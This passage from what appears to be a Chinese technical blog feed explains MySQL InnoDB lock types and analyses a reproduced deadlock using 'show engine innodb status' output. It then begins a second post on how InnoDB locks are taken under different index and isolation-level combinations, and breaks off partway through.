&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;  1. 在数据库层看到的结果是这样的：
      RECORD LOCKS space id 281 page no 5 n bits 72 index idx_c of table `lc_3`.`a` trx id 133588125 lock_mode X
  2. Next-Key Locks = Gap Locks + Record Locks 的结合, 不仅仅锁住记录，还会锁住间隙，
     比如： (negative infinity, 10】，(10, 11】区间，这些右边都是闭区间哦
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Insert Intention Locks&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;  1. 在数据库层看到的结果是这样的：
      RECORD LOCKS space id 279 page no 3 n bits 72 index PRIMARY of table `lc_3`.`t1` trx id 133587907 lock_mode X insert intention waiting
  2. Insert Intention Locks 可以理解为特殊的Gap锁的一种，用以提升并发写入的性能
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AUTO-INC Locks&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;  1. 在数据库层看到的结果是这样的：
      TABLE LOCK table xx trx id 7498948 lock mode AUTO-INC waiting
  2. 属于表级别的锁  
  3. 自增锁的详细情况可以之前的一篇文章:
      http://keithlan.github.io/2017/03/03/auto_increment_lock/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;/br&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;显示锁 vs 隐示锁&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code&gt;  * 显示锁(explicit lock)
      显示的加锁，在show engine innoDB status 中能够看到  ，会在内存中产生对象，占用内存  
      eg: select ... for update , select ... lock in share mode   
  * 隐示锁(implicit lock)
      implicit lock 是在索引中对记录逻辑的加锁，但是实际上不产生锁对象，不占用内存空间  

  * 哪些语句会产生implicit lock 呢？
     eg: insert into xx values(xx)
     eg: update xx set t=t+1 where id = 1 ; 会对辅助索引加implicit lock  
  * implicit lock 在什么情况下会转换成 explicit lock
    eg： 只有implicit lock 产生冲突的时候，会自动转换成explicit lock,这样做的好处就是降低锁的开销    
    eg: 比如：我插入了一条记录10，本身这个记录加上implicit lock，如果这时候有人再去更新这条10的记录，那么就会自动转换成explicit lock
  * 数据库怎么知道implicit lock的存在呢？如何实现锁的转化呢？
    1. 对于聚集索引上面的记录，有db_trx_id,如果该事务id在活跃事务列表中，那么说明还没有提交，那么implicit则存在  
    2. 对于非聚集索引：由于上面没有事务id，那么可以通过上面的主键id，再通过主键id上面的事务id来判断，不过算法要非常复杂，这里不做介绍
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;记录锁，间隙锁，Next-key 锁和插入意向锁。这四种锁对应的死锁如下：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;font color=red&gt;记录锁（LOCK_REC_NOT_GAP）: lock_mode X locks rec but not gap &lt;/font&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;font color=red&gt;间隙锁（LOCK_GAP）: lock_mode X locks gap before rec &lt;/font&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;font color=red&gt;Next-key 锁（LOCK_ORNIDARY）: lock_mode X &lt;/font&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;font color=red&gt;插入意向锁（LOCK_INSERT_INTENTION）: lock_mode X locks gap before rec insert intention &lt;/font&gt;&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;表格信息：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;  CREATE TABLE `t_bitfly` (
    `id` bigint(20) NOT NULL DEFAULT &#39;0&#39;,
    `num` int(20) DEFAULT NULL,
    PRIMARY KEY (`id`),
    KEY `num_key` (`num`)
  ) ENGINE=InnoDB DEFAULT CHARSET=gbk;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;表中数据：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;  mysql&amp;gt; select * from t_bitfly;
  +----+------+
  | id | num  |
  +----+------+
  |  1 |    2 |
  |  3 |    5 |
  |  8 |    7 |
  +----+------+
  3 rows in set (0.04 sec)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;数据库隔离级别为：可重复读（REPEATABLE-READ）&lt;/p&gt;

&lt;p&gt;模拟死锁场景：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  session 1:                                session 2:
  begin;                                    begin;
  delete from t_bitfly  where num = 5 ;
                                            delete from t_bitfly where num = 7 ;
  insert into t_bitfly values(7,7) ;
                                            insert into t_bitfly values(5,5) ;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;  insert into t_bitfly values(5,5)
  &amp;gt; 1213 - Deadlock found when trying to get lock; try restarting transaction
  &amp;gt; 时间: 0.085s
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;查询日志 ：&lt;code&gt;show engine innodb status ;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;结果如下&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-log&#34;&gt;
=====================================
2018-08-05 21:20:27 0x7fd40c082700 INNODB MONITOR OUTPUT
=====================================
Per second averages calculated from the last 4 seconds
-----------------
BACKGROUND THREAD
-----------------
srv_master_thread loops: 251 srv_active, 0 srv_shutdown, 22663 srv_idle
srv_master_thread log flush and writes: 22905
----------
SEMAPHORES
----------
OS WAIT ARRAY INFO: reservation count 513
OS WAIT ARRAY INFO: signal count 450
RW-shared spins 0, rounds 569, OS waits 286
RW-excl spins 0, rounds 127, OS waits 1
RW-sx spins 0, rounds 0, OS waits 0
Spin rounds per wait: 569.00 RW-shared, 127.00 RW-excl, 0.00 RW-sx
------------------------
LATEST DETECTED DEADLOCK
------------------------
2018-08-05 21:15:42 0x7fd40c0b3700
*** (1) TRANSACTION:
TRANSACTION 1095010, ACTIVE 21 sec inserting
mysql tables in use 1, locked 1
LOCK WAIT 5 lock struct(s), heap size 1136, 4 row lock(s), undo log entries 2
MySQL thread id 16, OS thread handle 140548578129664, query id 3052 183.6.50.229 root update
insert into t_bitfly values(7,7)
*** (1) WAITING FOR THIS LOCK TO BE GRANTED:
RECORD LOCKS space id 2514 page no 4 n bits 72 index num_key of table `test`.`t_bitfly` trx id 1095010 lock_mode X locks gap before rec insert intention waiting
Record lock, heap no 3 PHYSICAL RECORD: n_fields 2; compact format; info bits 32
 0: len 4; hex 80000007; asc     ;;
 1: len 8; hex 8000000000000008; asc         ;;

*** (2) TRANSACTION:
TRANSACTION 1095015, ACTIVE 6 sec inserting
mysql tables in use 1, locked 1
4 lock struct(s), heap size 1136, 4 row lock(s), undo log entries 2
MySQL thread id 17, OS thread handle 140548711855872, query id 3056 183.6.50.229 root update
insert into t_bitfly values(5,5)
*** (2) HOLDS THE LOCK(S):
RECORD LOCKS space id 2514 page no 4 n bits 72 index num_key of table `test`.`t_bitfly` trx id 1095015 lock_mode X
Record lock, heap no 1 PHYSICAL RECORD: n_fields 1; compact format; info bits 0
 0: len 8; hex 73757072656d756d; asc supremum;;

Record lock, heap no 3 PHYSICAL RECORD: n_fields 2; compact format; info bits 32
 0: len 4; hex 80000007; asc     ;;
 1: len 8; hex 8000000000000008; asc         ;;

*** (2) WAITING FOR THIS LOCK TO BE GRANTED:
RECORD LOCKS space id 2514 page no 4 n bits 72 index num_key of table `test`.`t_bitfly` trx id 1095015 lock_mode X locks gap before rec insert intention waiting
Record lock, heap no 3 PHYSICAL RECORD: n_fields 2; compact format; info bits 32
 0: len 4; hex 80000007; asc     ;;
 1: len 8; hex 8000000000000008; asc         ;;

省略。。。
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;一些注释：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;LATEST DETECTED DEADLOCK&lt;/strong&gt;：标示为最新发生的死锁；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;(1) TRANSACTION&lt;/strong&gt;：此处表示事务1开始 ；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;MySQL thread id 16, OS thread handle 140548578129664, query id 3052 183.6.50.229 root update&lt;/strong&gt;：此处为记录当前数据库线程id；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;insert into t_bitfly values(7,7)&lt;/strong&gt;：表示事务1在执行的sql ，不过比较悲伤的事情是show engine innodb status 是查看不到完整的事务的sql 的，通常显示当前正在等待锁的sql；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;(1) WAITING FOR THIS LOCK TO BE GRANTED&lt;/strong&gt;：此处表示当前事务1等待获取行锁；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;(2) TRANSACTION&lt;/strong&gt;：此处表示事务2开始 ；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;insert into t_bitfly values(5,5)&lt;/strong&gt;：表示事务2在执行的sql&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;(2) HOLDS THE LOCK(S)&lt;/strong&gt;：此处表示当前事务2持有的行锁；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;strong&gt;(2) WAITING FOR THIS LOCK TO BE GRANTED&lt;/strong&gt;：此处表示当前事务2等待获取行锁；&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;根据死锁日志可以看出：&lt;/p&gt;

&lt;p&gt;事务一在执行&lt;code&gt;insert into t_bitfly values(7,7)&lt;/code&gt;时，拥有非聚簇索引上的next-key锁(2,5]和间隙锁(5,7)，聚簇索引上持有id=3的记录锁。插入意向锁加锁时与事务2的next-key锁冲突，等待事务2的next-key锁释放；&lt;/p&gt;

&lt;p&gt;事务二在执行&lt;code&gt;insert into t_bitfly values(5,5)&lt;/code&gt;时，拥有非聚簇索引上的next-key锁(5,7]和间隙锁(7,+∞)，聚簇索引上持有id=8的记录锁，插入意向锁加锁时与事务1的next-key锁冲突，等待事务1的next-key锁释放。&lt;/p&gt;

&lt;p&gt;结合上面执行的sql来分析：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;事务一执行&lt;code&gt;delete from t_bitfly  where num = 5 ;&lt;/code&gt;后，持有 Gap Locks + Record Locks 也就是 next-key锁(2,5]和间隙锁(5,7)；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;事务二执行&lt;code&gt;delete from t_bitfly  where num = 7 ;&lt;/code&gt;后，获取了 Gap Locks + Record Locks 也就是 next-key锁(5,7]和间隙锁(7,+∞)；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;事务一执行&lt;code&gt;insert into t_bitfly values(7,7)&lt;/code&gt;时，持有next-key锁，插入意向锁加锁时被事务2的next-key阻止，等待事务二的next-key锁解锁；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;事务二执行&lt;code&gt;insert into t_bitfly values(5,5)&lt;/code&gt;时，持有next-key锁，插入意向锁加锁时被事务1的next-key阻止，等待事务二的next-key锁解锁；&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;产生死锁。&lt;/p&gt;

&lt;p&gt;解决方案：
&lt;code&gt;delete from t_bitfly  where num = 5&lt;/code&gt; 语句改成 &lt;code&gt;delete from t_bitfly  where id = 3&lt;/code&gt;,由主键删除加 + Repeatable Read,持有记录锁，插入意向锁与记录锁不冲突，可以插入。&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>MySQL加锁处理分析</title>
      <link>https://wangzitao6.github.io/2018-08-03-mysql%E5%8A%A0%E9%94%81%E5%A4%84%E7%90%86%E5%88%86%E6%9E%90</link>
      <pubDate>Fri, 03 Aug 2018 10:12:06 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2018-08-03-mysql%E5%8A%A0%E9%94%81%E5%A4%84%E7%90%86%E5%88%86%E6%9E%90</guid>
      <description>

&lt;h2 id=&#34;1-背景&#34;&gt;1 背景&lt;/h2&gt;

&lt;p&gt;MySQL/InnoDB的加锁分析，一直是一个比较困难的话题。我在工作过程中，经常会有同事咨询这方面的问题。同时，微博上也经常会收到MySQL锁相关的私信，让我帮助解决一些死锁的问题。本文，准备就MySQL/InnoDB的加锁问题，展开较为深入的分析与讨论，主要是介绍一种思路，运用此思路，拿到任何一条SQL语句，都能完整的分析出这条语句会加什么锁？会有什么样的使用风险？甚至是分析线上的一个死锁场景，了解死锁产生的原因。&lt;/p&gt;

&lt;p&gt;注：MySQL是一个支持插件式存储引擎的数据库系统。本文下面的所有介绍，都是基于InnoDB存储引擎，其他引擎的表现，会有较大的区别。&lt;/p&gt;

&lt;h3 id=&#34;1-1-mvcc-snapshot-read-vs-current-read&#34;&gt;1.1 MVCC：Snapshot Read vs Current Read&lt;/h3&gt;

&lt;p&gt;MySQL InnoDB存储引擎，实现的是基于多版本的并发控制协议——MVCC (Multi-Version Concurrency Control) (注：与MVCC相对的，是基于锁的并发控制，Lock-Based Concurrency Control)。MVCC最大的好处，相信也是耳熟能详：读不加锁，读写不冲突。在读多写少的OLTP应用中，读写不冲突是非常重要的，极大的增加了系统的并发性能，这也是为什么现阶段，几乎所有的RDBMS，都支持了MVCC。&lt;/p&gt;

&lt;p&gt;在MVCC并发控制中，读操作可以分成两类：快照读 (snapshot read)与当前读 (current read)。快照读，读取的是记录的可见版本 (有可能是历史版本)，不用加锁。当前读，读取的是记录的最新版本，并且，当前读返回的记录，都会加上锁，保证其他事务不会再并发修改这条记录。&lt;/p&gt;

&lt;p&gt;在一个支持MVCC并发控制的系统中，哪些读操作是快照读？哪些操作又是当前读呢？以MySQL InnoDB为例：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;快照读&lt;/strong&gt;：简单的select操作，属于快照读，不加锁。(当然，也有例外，下面会分析)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;select * from table where ?;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;当前读&lt;/strong&gt;：特殊的读操作，插入/更新/删除操作，属于当前读，需要加锁。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-SQL&#34;&gt;  select * from table where ? lock in share mode;
  select * from table where ? for update;
  insert into table values (…);
  update table set ? where ?;
  delete from table where ?;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;所有以上的语句，都属于当前读，读取记录的最新版本。并且，读取之后，还需要保证其他并发事务不能修改当前记录，对读取记录加锁。其中，除了第一条语句，对读取记录加S锁 (共享锁)外，其他的操作，都加的是X锁 (排它锁)。&lt;/p&gt;

&lt;p&gt;为什么将 插入/更新/删除 操作，都归为当前读？可以看看下面这个 更新 操作，在数据库中的执行流程：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/1.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从图中，可以看到，一个Update操作的具体流程。当Update SQL被发给MySQL后，MySQL Server会根据where条件，读取第一条满足条件的记录，然后InnoDB引擎会将第一条记录返回，并加锁 (current read)。待MySQL Server收到这条加锁的记录之后，会再发起一个Update请求，更新这条记录。一条记录操作完成，再读取下一条记录，直至没有满足条件的记录为止。因此，Update操作内部，就包含了一个当前读。同理，Delete操作也一样。Insert操作会稍微有些不同，简单来说，就是Insert操作可能会触发Unique Key的冲突检查，也会进行一个当前读。&lt;/p&gt;

&lt;p&gt;注：根据上图的交互，针对一条当前读的SQL语句，InnoDB与MySQL Server的交互，是一条一条进行的，因此，加锁也是一条一条进行的。先对一条满足条件的记录加锁，返回给MySQL Server，做一些DML操作；然后在读取下一条加锁，直至读取完毕。&lt;/p&gt;

&lt;h3 id=&#34;1-2-cluster-index-聚簇索引&#34;&gt;1.2 Cluster Index：聚簇索引&lt;/h3&gt;

&lt;p&gt;InnoDB存储引擎的数据组织方式，是聚簇索引表：完整的记录，存储在主键索引中，通过主键索引，就可以获取记录所有的列。关于聚簇索引表的组织方式，可以参考MySQL的官方文档：&lt;a href=&#34;https://dev.mysql.com/doc/refman/8.0/en/innodb-index-types.html&#34;&gt;Clustered and Secondary Indexes&lt;/a&gt; 。本文假设读者对这个，已经有了一定的认识，就不再做具体的介绍。接下来的部分，主键索引/聚簇索引 两个名称，会有一些混用，望读者知晓。&lt;/p&gt;

&lt;h3 id=&#34;1-3-2pl-two-phase-locking&#34;&gt;1.3 2PL：Two-Phase Locking&lt;/h3&gt;

&lt;p&gt;传统RDBMS加锁的一个原则，就是2PL (二阶段锁)：&lt;a href=&#34;https://en.wikipedia.org/wiki/Two-phase_locking&#34;&gt;Two-Phase Locking&lt;/a&gt;。相对而言，2PL比较容易理解，说的是锁操作分为两个阶段：加锁阶段与解锁阶段，并且保证加锁阶段与解锁阶段不相交。下面，仍旧以MySQL为例，来简单看看2PL在MySQL中的实现。
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/2.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从上图可以看出，2PL就是将加锁/解锁分为两个完全不相交的阶段。加锁阶段：只加锁，不放锁。解锁阶段：只放锁，不加锁。&lt;/p&gt;

&lt;h3 id=&#34;1-4-isolation-level&#34;&gt;1.4 Isolation Level&lt;/h3&gt;

&lt;p&gt;隔离级别：Isolation Level，也是RDBMS的一个关键特性。相信对数据库有所了解的朋友，对于4种隔离级别：Read Uncommited，Read Committed，Repeatable Read，Serializable，都有了深入的认识。本文不打算讨论数据库理论中，是如何定义这4种隔离级别的含义的，而是跟大家介绍一下MySQL/InnoDB是如何定义这4种隔离级别的。&lt;/p&gt;

&lt;p&gt;MySQL/InnoDB定义的4种隔离级别：&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Read Uncommited&lt;/strong&gt;：可以读取未提交记录。此隔离级别，不会使用，忽略。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Read Committed (RC)&lt;/strong&gt;：快照读忽略，本文不考虑。针对当前读，&lt;strong&gt;RC隔离级别保证对读取到的记录加锁 (记录锁)&lt;/strong&gt;，存在幻读现象。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;epeatable Read (RR)&lt;/strong&gt;：快照读忽略，本文不考虑。针对当前读，&lt;strong&gt;RR隔离级别保证对读取到的记录加锁 (记录锁)，同时保证对读取的范围加锁，新的满足查询条件的记录不能够插入 (间隙锁)&lt;/strong&gt;，不存在幻读现象。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Serializable&lt;/strong&gt;：从MVCC并发控制退化为基于锁的并发控制。不区别快照读与当前读，所有的读操作均为当前读，读加读锁 (S锁)，写加写锁 (X锁)。&lt;/p&gt;

&lt;p&gt;Serializable隔离级别下，读写冲突，因此并发度急剧下降，在MySQL/InnoDB下不建议使用。&lt;/p&gt;

&lt;h2 id=&#34;2-一条简单sql的加锁实现分析&#34;&gt;2 一条简单SQL的加锁实现分析&lt;/h2&gt;

&lt;p&gt;在介绍完一些背景知识之后，本文接下来将选择几个有代表性的例子，来详细分析MySQL的加锁处理。当然，还是从最简单的例子说起。经常有朋友发给我一个SQL，然后问我，这个SQL加什么锁？就如同下面两条简单的SQL，他们加什么锁？&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;SQL1：select * from t1 where id = 10;&lt;/p&gt;

&lt;p&gt;SQL2：delete from t1 where id = 10;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;针对这个问题，该怎么回答？我能想象到的一个答案是：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;SQL1：不加锁。因为MySQL是使用多版本并发控制的，读不加锁。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;SQL2：对id = 10的记录加写锁 (走主键索引)。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;这个答案对吗？说不上来。即可能是正确的，也有可能是错误的，已知条件不足，这个问题没有答案。如果让我来回答这个问题，我必须还要知道以下的一些前提，前提不同，我能给出的答案也就不同。要回答这个问题，还缺少哪些前提条件？&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;前提一：&lt;strong&gt;id列是不是主键&lt;/strong&gt;？&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;前提二：&lt;strong&gt;当前系统的隔离级别是什么&lt;/strong&gt;？&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;前提三：&lt;strong&gt;id列如果不是主键，那么id列上有索引吗&lt;/strong&gt;？&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;前提四：&lt;strong&gt;id列上如果有二级索引，那么这个索引是唯一索引吗&lt;/strong&gt;？&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;前提五：&lt;strong&gt;两个SQL的执行计划是什么？索引扫描？全表扫描&lt;/strong&gt;？&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;没有这些前提，直接就给定一条SQL，然后问这个SQL会加什么锁，都是很业余的表现。而当这些问题有了明确的答案之后，给定的SQL会加什么锁，也就一目了然。下面，我将这些问题的答案进行组合，然后按照从易到难的顺序，逐个分析每种组合下，对应的SQL会加哪些锁？&lt;/p&gt;

&lt;p&gt;注：下面的这些组合，我做了一个前提假设，也就是有索引时，执行计划一定会选择使用索引进行过滤 (索引扫描)。但实际情况会复杂很多，真正的执行计划，还是需要根据MySQL输出的为准。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;组合一：id列是主键，RC隔离级别&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;组合二：id列是二级唯一索引，RC隔离级别&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;组合三：id列是二级非唯一索引，RC隔离级别&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;组合四：id列上没有索引，RC隔离级别&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;组合五：id列是主键，RR隔离级别&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;组合六：id列是二级唯一索引，RR隔离级别&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;组合七：id列是二级非唯一索引，RR隔离级别&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;组合八：id列上没有索引，RR隔离级别&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;组合九：Serializable隔离级别&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;排列组合还没有列举完全，但是看起来，已经很多了。真的有必要这么复杂吗？事实上，要分析加锁，就是需要这么复杂。但是从另一个角度来说，只要你选定了一种组合，SQL需要加哪些锁，其实也就确定了。接下来，就让我们来逐个分析这9种组合下的SQL加锁策略。&lt;/p&gt;

&lt;p&gt;注：在前面八种组合下，&lt;strong&gt;也就是RC，RR隔离级别下，SQL1：select操作均不加锁，采用的是快照读&lt;/strong&gt;，因此在下面的讨论中就忽略了，主要讨论SQL2：delete操作的加锁。&lt;/p&gt;

&lt;h3 id=&#34;2-1-组合一-id主键-rc&#34;&gt;2.1 组合一：id主键+RC&lt;/h3&gt;

&lt;p&gt;这个组合，是最简单，最容易分析的组合。id是主键，Read Committed隔离级别，给定SQL：&lt;code&gt;delete from t1 where id = 10;&lt;/code&gt; 只需要将主键上，id = 10的记录加上X锁即可。如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/3.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;结论：id是主键时，此SQL只需要在id=10这条记录上加X锁即可。&lt;/p&gt;

&lt;h3 id=&#34;2-2-组合二-id唯一索引-rc&#34;&gt;2.2 组合二：id唯一索引+RC&lt;/h3&gt;

&lt;p&gt;这个组合，id不是主键，而是一个Unique的二级索引键值。那么在RC隔离级别下，&lt;code&gt;delete from t1 where id = 10;&lt;/code&gt; 需要加什么锁呢？见下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/4.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;此组合中，id是unique索引，而主键是name列。此时，加锁的情况由于组合一有所不同。由于id是unique索引，因此delete语句会选择走id列的索引进行where条件的过滤，在找到id=10的记录后，首先会将unique索引上的id=10索引记录加上X锁，同时，会根据读取到的name列，回主键索引(聚簇索引)，然后将聚簇索引上的name = ‘d’ 对应的主键索引项加X锁。&lt;strong&gt;为什么聚簇索引上的记录也要加锁？&lt;/strong&gt; 试想一下，如果并发的一个SQL，是通过主键索引来更新：update t1 set id = 100 where name = ‘d’; 此时，如果delete语句没有将主键索引上的记录加锁，那么并发的update就会感知不到delete语句的存在，违背了同一记录上的更新/删除需要串行执行的约束。&lt;/p&gt;

&lt;p&gt;结论：&lt;strong&gt;若id列是unique列，其上有unique索引。那么SQL需要加两个X锁，一个对应于id unique索引上的id = 10的记录，另一把锁对应于聚簇索引上的[name=’d’,id=10]的记录&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&#34;2-3-组合三-id非唯一索引-rc&#34;&gt;2.3 组合三：id非唯一索引+RC&lt;/h3&gt;

&lt;p&gt;相对于组合一、二，组合三又发生了变化，隔离级别仍旧是RC不变，但是id列上的约束又降低了，id列不再唯一，只有一个普通的索引。假设&lt;code&gt;delete from t1 where id = 10;&lt;/code&gt; 语句，仍旧选择id列上的索引进行过滤where条件，那么此时会持有哪些锁？同样见下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/5.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;根据此图，可以看到，首先，id列索引上，满足id = 10查询条件的记录，均已加锁。同时，这些记录对应的主键索引上的记录也都加上了锁。与组合二唯一的区别在于，组合二最多只有一个满足等值查询的记录，而组合三会将所有满足查询条件的记录都加锁。&lt;/p&gt;

&lt;p&gt;结论：&lt;strong&gt;若id列上有非唯一索引，那么对应的所有满足SQL查询条件的记录，都会被加锁。同时，这些记录在主键索引上的记录，也会被加锁&lt;/strong&gt;。&lt;/p&gt;

&lt;h3 id=&#34;2-4-组合四-id无索引-rc&#34;&gt;2.4 组合四：id无索引+RC&lt;/h3&gt;

&lt;p&gt;相对于前面三个组合，这是一个比较特殊的情况。&lt;strong&gt;id列上没有索引，where id = 10;这个过滤条件，没法通过索引进行过滤，那么只能走全表扫描做过滤&lt;/strong&gt;。对应于这个组合，SQL会加什么锁？或者是换句话说，全表扫描时，会加什么锁？这个答案也有很多：有人说会在表上加X锁；有人说会将聚簇索引上，选择出来的id = 10;的记录加上X锁。那么实际情况呢？请看下图：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/6.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;由于id列上没有索引，因此只能走聚簇索引，进行全部扫描&lt;/strong&gt;。从图中可以看到，满足删除条件的记录有两条，但是，&lt;strong&gt;聚簇索引上所有的记录，都被加上了X锁。无论记录是否满足条件&lt;/strong&gt;，全部被加上X锁。既不是加表锁，也不是在满足条件的记录上加行锁。&lt;/p&gt;

&lt;p&gt;有人可能会问？为什么不是只在满足条件的记录上加锁呢？这是由于MySQL的实现决定的。&lt;strong&gt;如果一个条件无法通过索引快速过滤，那么存储引擎层面就会将所有记录加锁后返回，然后由MySQL Server层进行过滤。因此也就把所有的记录，都锁上了&lt;/strong&gt;。&lt;/p&gt;

&lt;p&gt;注：在实际的实现中，MySQL有一些改进，在MySQL Server过滤条件，发现不满足后，会调用unlock_row方法，把不满足条件的记录放锁 (违背了2PL的约束)。这样做，保证了最后只会持有满足条件记录上的锁，但是每条记录的加锁操作还是不能省略的。&lt;/p&gt;

&lt;p&gt;结论：&lt;font color=red&gt; &lt;strong&gt;若id列上没有索引，SQL会走聚簇索引的全扫描进行过滤，由于过滤是由MySQL Server层面进行的。因此每条记录，无论是否满足条件，都会被加上X锁&lt;/strong&gt;。但是，为了效率考量，MySQL做了优化，&lt;strong&gt;对于不满足条件的记录，会在判断后放锁，最终持有的，是满足条件的记录上的锁，但是不满足条件的记录上的加锁/放锁动作不会省略&lt;/strong&gt;。同时，优化也违背了2PL的约束&lt;/font&gt;。&lt;/p&gt;

&lt;h3 id=&#34;2-5-组合五-id主键-rr&#34;&gt;2.5 组合五：id主键+RR&lt;/h3&gt;

&lt;p&gt;上面的四个组合，都是在Read Committed隔离级别下的加锁行为，接下来的四个组合，是在Repeatable Read隔离级别下的加锁行为。&lt;/p&gt;

&lt;p&gt;组合五，id列是主键列，&lt;code&gt;Repeatable Read&lt;/code&gt; 隔离级别，针对&lt;code&gt;delete from t1 where id = 10;&lt;/code&gt; 这条SQL，加锁与组合一：&lt;a href=&#34;https://wangzitao6.github.io/2018-08-03-mysql加锁处理分析/#2-1-组合一-id主键-rc&#34;&gt;id主键，Read Committed&lt;/a&gt;一致。&lt;/p&gt;

